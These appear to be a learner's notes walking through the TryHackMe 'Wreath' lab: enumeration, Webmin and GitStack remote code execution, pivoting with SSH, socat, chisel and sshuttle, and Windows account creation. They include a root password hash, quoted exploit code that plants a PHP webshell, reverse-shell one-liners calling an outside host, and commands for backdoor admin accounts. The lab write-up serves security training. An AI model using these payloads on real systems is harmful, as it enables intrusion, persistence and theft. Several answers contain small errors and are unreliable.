THM Network Wreath 
--------------------

Machine 1 

Ip = 10.200.104.200
--------------------

Enumeration Part
=================

Open Ports

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2021-04-12T08:17:50
|_Not valid after:  2022-04-12T08:17:50
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

--------------------------------------------------------------------------------------------------------------------------------------------------------

from port 9090 traceroute information shows ip "10.50.105.1"
-----------------------------------------------------------

Question:
=========

1) totel Open Ports 
A: 4
## nmap scan shows 4 open port and on 1 closed port 

2) Operating system they use.
A: centos 
## In nmap service scan on http-Headers section they show operating system detail

3) by visiting the webserver by ip there they redirect us.
A: https://thomaswreath.thm/

5) what is thomas mobile phone number?
A: +447821548812 

6) what server version running here.
A: MiniServ 1.890 (Webmin httpd)
## nmap scan report on port 10000 they show you the server version running on.

Q&: This web server is vulnerable to RCE.what is the exploit CVE?
A: cve-2019-15107
========================================================================================================================================================

Exploitation Phase

Q2: what user was the server running as 
A: root

Q5: what is the root user password hash.
A: $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

Q6: there is a file that gave you consistant access.what is the full path of that file.
A: /root/.ssh/id_rsa
## this is the path of ssh privat key just see the content of file using cat and copy the content of the file and save in your local machine 
========================================================================================================================================================
Pivoting Part
-------------

 High-level Overview
 --------------------

 Q1:  Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
 A: Tunnelling

 Q2: what meterpreter command use for port forwording.
 A: portfwd

  Enumeration:
  ------------

 ----------------------
 bash one liner ping sweep command on linux 

 ----------------------------------------------------------------------------
 for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
 ----------------------------------------------------------------------------

 Port scanning in bash can be done (ideally) entirely natively:

 --------------------------------------------------------------------------------------------------
 for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
 -------------------------------------------------------------------------------------------------



Q1: What is the absolute path to the file containing DNS entries on Linux?
A:  /etc/resolv.conf

Q2: What is the absolute path to the hosts file on Windows?
A: C:\Windows\System32\drivers\etc\hosts

Q3: How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
A:  for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done



Proxychains & Foxyproxy:
------------------------

Q1: What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
A: socks4 127.0.0.1 4242

Q2: What command would you use to telnet through a proxy to 172.16.0.100:23?
A: proxychains telnet 172.16.0.100 23

Q3: You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
A: fp

 SSH Tunnelling / Port Forwarding:
 ---------------------------------

Q1: If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
A: L

Q2: Which switch combination can be used to background an SSH port forward or tunnel?
A:-fN

Q3: It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
A: Nay

Q4: What command would you use to create a pair of throwaway SSH keys for a reverse connection?
A: ssh-keygen

Q5: If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
A: ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa

Q6: What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
A: ssh -D 8000 user@target.thm -fN

Q7: If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
A: ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN


## Commands that is use for ssh tunuling
   
   Method: Port forwording:
   ------------------------

   Command syntax:     ssh -L {attacking machine local port}:{victum machine webserver ip}:{victum machine webserver port} {compromise user account name}@{compromise user account ip} -fN

   Command Example:    ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN

   -L : create a link to local port.
   -f : backgrounds the shell immediately so that we have our own terminal back.
   -N : tells SSH that it doesn't need to execute any commands -- only set up the connection.

   Method: Creating a Proxy
   ------------------------


   Command syntax: ssh -D {attacking machine local port which is use for proxy} {victum machine user acccount name}@{victum machine ip} -fN

   command Example : ssh -D 8000 user@target.thm -fN

   -D : Proxies are made using this flag.This will open up port on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains.
   -f : backgrounds the shell immediately so that we have our own terminal back.
   -N : tells SSH that it doesn't need to execute any commands -- only set up the connection.


   Command Example: ssh -D 1337 user@172.16.0.5 -fN

 ## Commands that is use for ssh Reverse connection
----------------------------------------------------

 ==> To make a reverse connection use the following steps

 1) First, generate a new set of SSH keys and store them somewhere safe using the following command.

 command: ssh-keygen

 ## Note: this step follow on attacking machine.
 This will create two new files: a private key, and a public key.

 2) Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.

 3) On a new line, type the following line, then paste in the public key:

command= "echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty

This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

 4) Next. check if the SSH server on your attacking machine is running with the following command

 command: sudo systemctl status ssh

 ## If the status command indicates that the server is not running then you can start the ssh service with the following command:
 sudo systemctl start ssh

 5) The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

 With the key transferred, we can then connect back with a reverse port forward using the following command:

 command syntax : ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

 command Example : ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa

 ## This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!


 ## Note: In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
 command : ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

 This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

 plink.exe:
 ----------

 
 command for sending binary and use it to gain reverse connection

 command: cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

 ## cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise)

 Example:
---------
  To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this
 command: cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N

 ## Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using 
 command: sudo apt install putty-tools.
 After downloading the tool, conversion can be done with:
 command: puttygen KEYFILE -o OUTPUT_KEY.ppk
 
 Substituting in a valid file for the keyfile, and adding in the output file.

 The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).

 Q:  What tool can be used to convert OpenSSH keys into PuTTY style keys?
 A: puttygen


  Socat:
  ------
 ## to share the binary of socat in the compromise machine go to the folder/location of the
 binary of the socat and open terminal there and use the following command 

 command: sudo python3 -m http.server 80 

 ## this is same as we use apache server to share a file 

 then,on the target use this command 

 command: curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME

 Method Reverse shell Relay
 --------------------------

  1) First let's start a standard netcat listener on our attacking box 

  commad: sudo nc -lvnp 443

  2) Next, on the compromised server, use the following command to start the relay:
 
 command: ./socat tcp-l:8000 tcp:ATTACKING_IP:443 & 

 ## Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.

 A brief explanation of the above command:
 -----------------------------------------


 ==> tcp-l:8000 :
     ------------
  This is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.

 ==> tcp:ATTACKING_IP:443 :
     ----------------------
  connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.

 ==>  & :
     ---
    backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.



  Easy Method of Port Forwording
  -------------------------------


  ## The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:

  command : ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

  fork : option is used to put every connection into a new process.

  reuseaddr : option means that the port stays open after a connection is made to it.
   
  & : to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.


  Method Port Forwarding -- Quiet
  -------------------------------

  ## The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

  1) First of all, on our own attacking machine, we issue the following command:

  command: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

  ### This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.


  2) Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
 
 command: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

 ## This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:

 command: ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

 ## This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

 ## This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

  ==> The request goes to 127.0.0.1:8000

  ==> Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001

  ==> Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.



  ## The process is then reversed when the target sends the response:
 
  ==> The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.

  ==> Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.


  Q1:  Which socat option allows you to reuse the same listening port for more than one connection?
  A: reuseaddr

  ## 

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? 

Q2: Use TCP port 8000 for the server listener, and do not background the process.
A:  ./socat tcp-l:8000 tcp:172.16.0.200:443

## hint: ./socat tcp-l:LISTEN_PORT tcp:ATTACKING_IP:ATTACKING_PORT

Q3: What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
A: ./socat tcp-l:2222,fork,reuseaddr 172.16.0.100:22 &

## Hint easy method
command: ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &


## Optional question  Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this.

As i have no subcription so i google it and i found this link to create encripted connetion using socat

Link: https://blogs.query.ai/creating-a-secure-encrypted-channel-with-socat

And this article about encripted connection using socat they say:


Creating an encrypted communication channel between two socat instances
------------------------------------------------------------------------


For more serious purposes, such as creating an encrypted channel with two socat instances, we would also want to use OpenSSL. So first, let's create a certificate that is self-signed for your FQDN. Here is the cert generation process first:

$ openssl genrsa -out server.key 2048
$ openssl req -new -key server.key -x509 -days 365 -out server.crt

For this walkthrough, we will name it localhost. Then do this:

$ cat server.key server.cert > server.pem
$ chmod 0600 server.pem server.key

Now we are ready to run a secure SSL/TLS encrypted communication channel between two socat instances. One acts as an SSL server and one as the client, which the server prints out a command output. The client connects, reads the output on an encrypted channel, and then returns. This process is just one example of what we can achieve. You can also ask the client to read from standard input or echo what the client sends to store the client data on a file.

On a tmux split terminal type this:

$ socat ssl-l:2443,reuseaddr,fork,cert=server.pem,cafile=server.crt,verify=1 exec:'/bin/date’

On the other terminal please invoke the client:

$ socat - ssl:localhost:2443,cert=server.pem,cafile=server.crt

I get this as output.

Tue Jun 30 13:17:23 IST 2020

Now to echo:

$ socat echo -

You can type something which will get returned.






Chisel:
-------

secure copy method to send binary to compromise machine 
command: scp -i KEY chisel user@target:/tmp/chisel-USERNAME


Method Reverse SOCKS Proxy:
---------------------------

## Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.

On our own attacking box we would use a command that looks something like this:

command: ./chisel server -p LISTEN_PORT --reverse &

## This sets up a listener on your chosen LISTEN_PORT.

## On the compromised host, we would use the following command:

command: ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

## This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.

## Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. 



Method Forward SOCKS Proxy:
---------------------------

## First, on the compromised host we would use:

command: ./chisel server -p LISTEN_PORT --socks5

## On our own attacking box we would then use:

command: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

## In this command, PROXY_PORT is the port that will be opened for the proxy.


Example:


command: ./chisel client 172.16.0.10:8080 1337:socks

## would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.



## Note: 
--------

Proxychains Reminder:
---------------------
## When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:


[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 1080



Method Remote Port Forward:
---------------------------

## For a remote port forward, on our attacking machine we use the exact same command as before:

command: ./chisel server -p LISTEN_PORT --reverse &

## Once again this sets up a chisel listener for the compromised host to connect back to.
The command to connect back is slightly different this time, however:

command: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

## You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons.


##  Note the distinction between the LISTEN_PORT and the LOCAL_PORT

==> LISTEN_PORT: this is the port that we started the chisel server on.


==> LOCAL_PORT: this is the port we wish to open on our own attacking machine to link with the desired target port


Example:

##  To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:

command: ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &


 ## Connecting back to our attacking machine, functioning as a chisel server started with:

command: ./chisel server -p 1337 --reverse & 


Method Local Port Forword:
--------------------------


## As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

On the compromised target we set up a chisel server:

command: ./chisel server -p LISTEN_PORT

## We now connect to this from our attacking machine like so:

command: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT

Example: 

For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:

command: ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22



Q1: What command would you use to start a chisel server for a reverse connection on your attacking machine?

Use port 4242 for the listener and do not background the process.
A: ./chisel server -p 4242 --reverse

## hint: command: ./chisel server -p LISTEN_PORT --reverse &


Q2: What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
A: ./chisel client 172.16.0.200:4242 R:socks &

## hint command: ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

Q3: How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
A: ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100 &

## hint command syntax : ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &


Q4: If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
A: ./chisal client 172.16.0.5:4444 8000:172.16.0.10:80

## hint command syntax:  ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT



 sshuttle:
 ---------


 this can be install on kali with simple command 

 command: sudo apt install sshuttle


 ## The base command for connecting to a server with sshuttle is as follows:

 command:  sshuttle -r username@address subnet  
 

 command Example:


  ## In our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
 
 command:  sshuttle -r user@172.16.0.5 172.16.0.0/24

  they would be user password and then proxy established

  rather then specifing subnet we would us -N that set it autometicly based on compromise server routing table 

  so command like this 

  command syntax: sshuttle -r username@address -N

  ## bear in mind this is not always seccessfull


  #### As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.

If this has worked, you should see the following line:
c : Connected to server.


## what happend if we have no password for the compromise server we have only its ssh keyfile.Unfortunativly sshuttle have no keyfile authentication method so this is easyly bypass by using "--ssh-cmd"  switch .

--ssh-cmd: This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no arguments. With the --ssh-cmd switch, we can pick a different command to execute for authentication: say, ssh -i keyfile

so when we have only keyfile authentication so we use command like this 

command syntax: sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET

 ### To use our example from before, the command would be:

command: sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24

 


 ### while conecting to the server we may encounter some error like this 



 client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255



### This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.

so To get around this, we tell sshuttle to exlude the compromised server from the subnet range using the -x switch.

Now with the include this switch our like this 


command: sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

## This will allow sshuttle to create a connection without disrupting itself.


Q1: How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

A: sshuttle -r pwned@172.16.20.7 172.16.0.0/24

## hint:   sshuttle -r username@address subnet 

Q2: What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

A: --ssh-cmd ssh -i priv_key

## hint: --ssh-cmd

Q3: You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

What switch (and argument) could you use to fix this error?

A: -x 172.16.0.100

## hint: -x 

##
command that are use in my network to create proxy is

cmd:  sshuttle -r root@10.200.105.200 10.200.105.0/24 --ssh-cmd "ssh -i THM/Wreath/ssh_key/id_rsa" -x 10.200.105.200
##

 Conclusion:
 -----------

 ###As a summary of the tools in this section:

    Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
    SSH can be used to create both port forwards, and proxies
    plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
    Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
    Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
    sshuttle is a nicer way to create a proxy when we have SSH access on a target


======================================================================================================================================================


Git Server Enumeration Phase
-----------------------------

## To send binaries like nmap to the target/compromise system there are diffrent method to send it like SCP(secure copy),python server,apache server,php server etc but we use python server now 

==> go to the directory where you static binary presence open teminal here and user command 

command: sudo python3 -m http.server 80

## Note dont close the terminal.close it when you download the binary to the compromise system

## Above command open a port 80 on your system and create a server to the directory where you binaries are presence so just use the following commnand to your compromise system to download the file 

command: curl {ATTACKING_IP}/{file name} -o /tmp/nmap-USERNAME && chmod +x /tmp/{file name}


{ATTACKING_IP}: attacking ip is your attacking machine ip 

{file name}: file name is your binary name ## case sensitive

-o : this flag is use to save the binary to the path 

&& chmod +x : this is use to make your binary executable 

## you can use wget command to download the file also 

command: wget http://attacking_ip/binary_name

this command save the binary your corrent directry

## nmap scan report shows to ip excluding other that are not use 

IP Addr 1 = (10.200.104.100) MAC Address: 02:BC:EC:04:FA:2B 
IP Addr 2 = (10.200.104.150) MAC Address: 02:9C:29:A9:96:67

Q1: Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?
A: 2

Q2: In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
A: 100,150

Nmap scan report of machine 1


all 1500 port are filtered

Nmap scan report of machine 2

PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:F4:7E:8B:78:3F (Unknown)


Q3: Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
A: 80,3389,5985

Q4: Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
A: http



Git Server Pivoting Phase:
--------------------------

Now we have to pivote things with the pivoting tecniques mention above so now we use sshuttle to pivote our connection using command 

command: sshuttle -r root@10.200.104.200 --ssh-cmd "ssh -i ~/THM/Wreath/ssh_key/id_rsa" 10.200.104.0/24 -x 10.200.104.200

## After connection is sucessfull we see its web server to our attacking machine with any browser just write the ip address of the machine on the browser and we see the page on our attacking machine 

Q1: What is the name of the program running the service?
A: gitstack

## hint When you first connect to the service you will see an error screen with three expected routing patterns given. The second pattern (without the symbols at the start and end) is the answer to this question. Append it to the URL to get to a login screen.

## After going to the login page they shows default credentials test it 

Q2: Do these default credentials work (Aye/Nay)?
A: Nay

## so, they are not work so we have to do other things so first check if they have public exploite 
we search the exploit to our own exploitdb with the command 

command: searchsploit gitstack  

this shows the public exploite one of them have python remote code execution(RCE)

Q3: You will see that there are three publicly available exploits.
There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
A: 43777

## hint: The EDB ID number is given as part of the exploit name. Look under the "Path" column of the results table. You're looking for an exploit called NUMBER.py. The number (by itself, without the file extension) is the answer to this question.


Git Server Code Review: 
-----------------------


As we find the exploit that might work on the target so we can mirror the exploite to our machine with the command

command: searchsploit -m EDBID

This command copy the exploite and we can use this exploite now

## Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, which can cause problems in scripts when executed on Linux:
Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:

command: dos2unix ./EDBID.py

Or if we have not dostounix tool install so we can use this command 

command: sed -i 's/\r//' ./EDBID.py

Q1: Look at the information at the top of the script. On what date was this exploit written?
A: 18.01.2018

## As this is the python script we have to identify which python version they are written because python2 program not run with python3 compiler and vise versa so we have check it 

## One method we discussed here is by "print" statement in the code. Is program print statement have rounding brackets in the code then it is python3 program .e.g. print ("hello world!") . If not then they are python2 program .e.g. print "hello world!" .

Q2: Bearing this in mind, is the script written in Python2 or Python3?
A: python2

## now we know what version of python they use so we can run it by two method 

1) Using the appropriate interpreter directly (e.g. python3 exploit.py / python2 exploit.py)

2) Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: #!. You then specify the absolute path to the interpreter, so: #!/usr/bin/python3 / #!/usr/bin/python2 / #!/bin/sh, etc. This means that if we execute the script using ./exploit.py, it will be executed by the correct interpreter.


Q3: Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit? 
A: csrftoken


Git Server Exploitation: 
------------------------

## we have the exploit and we made changes with our sakes now we have run it and check it is it works in my case they work perfectly and they gave me command execution with NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

## from that we know that machine is windows machine 

### so we have command execution on the machine so we have to choices to gain a reverse shell 

1) We could change the command in the exploit and re-run the code
## change the command and re run the make another file so thats not so good 

2) We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
## this looks betters so now we do this 

## from the code

##
print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-NoobHacker69.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit-NoobHacker69.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')

## 

this part of the code we know the code make a post request with parameter 'a' by default so we make the post request send it to the server to execute our command with making another file 

## we achive this with the two method 
1) curl command 
2) burpsuit 

so we use curl command 

 Command syntax: curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"

## this method is easy and speedy so use of this is recommended

## burpsuite method work fine but it is lengthy as first open burp proxy then make a request and then send it to the repeater and the changing it content with our sake so that so timetaking so use curl command is good 

## php reverse shell tiny code

##
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
##

## php reverse shell tiny command for linux

##
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
##

Q2: What is the hostname for this target? 
A: git-serv

Q3: What operating system is this target? 
A: windows

Q4: What user is the server running as?
A: nt authority\system

### 

Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the ping command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.

To start up a TCPDump listener we would use the following command:
tcpdump -i tun0 icmp

Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using ip -a link to see the available interfaces.

Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):
ping -n 3 ATTACKING_IP

This will send three ICMP ping packets back to you.

Q5: How many make it to the waiting listener? 
A: 0


## As we see the target is not connect outside the world so we have to do other things

we can do two things with our own choice 

1) Given we have a fully stable shell on .200, we could upload a static copy of netcat and just catch the shell here

2) We could set up a relay on .200 to forward a shell back to a listener

## It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users at earlier stages of the network and ensure that any ports you open are above 15000.

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:

command: firewall-cmd --zone=public --add-port PORT/tcp

## In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).


Git Server Stabilisation & Post Exploitation:
---------------------------------------------

## In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate privileges on this target.

In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let's consolidate our position a little.

From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).

Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.

We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use anywhere else.

First we create the account itself:

command syntax: net user USERNAME PASSWORD /add

## Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:

Command syntax: net localgroup Administrators USERNAME /add

command syntax: net localgroup "Remote Management Users" USERNAME /add

## After that we can check can we add our user to addmistrator group and remote managment group by the command 

